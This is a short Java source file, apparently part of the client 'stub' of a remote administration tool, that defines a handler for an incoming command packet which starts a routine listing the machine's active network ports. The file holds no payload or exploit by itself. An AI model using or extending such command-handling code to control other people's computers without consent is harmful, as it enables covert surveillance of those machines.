package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.ActivePorts;

public class Packet73ActivePorts extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new ActivePorts().start();
	}

}
